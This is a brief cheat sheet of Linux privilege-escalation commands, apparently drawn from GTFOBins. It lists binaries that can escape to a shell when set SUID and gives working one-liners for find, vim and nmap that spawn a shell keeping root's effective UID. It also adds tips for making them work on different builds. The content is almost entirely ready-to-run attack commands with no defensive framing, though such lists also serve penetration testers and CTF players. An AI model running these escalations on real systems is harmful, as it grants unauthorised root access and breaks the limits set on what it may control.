Common SUID GTFOBins escapes: bash, dash, find, vim/vi/view, nmap, awk, perl, python, ruby, php, lua, node, less, more, man, ftp, gdb, tar, zip, cp, mv, dd, env, nice, timeout, flock, setarch, taskset, watch, socat, openssl, ed, emacs, git, make, rsync, sed, stdbuf, strace, tclsh, tmux, xargs, zsh, busybox.

**find**
```
find . -exec /bin/sh -p \; -quit
```

**vim**
```
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

**nmap**
```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
```

Notes:
- `sh -p` keeps euid — SUID shells drop privileges without it.
- vim needs +python3 build.
- Newer nmap demands target arg; append `127.0.0.1` if it errors.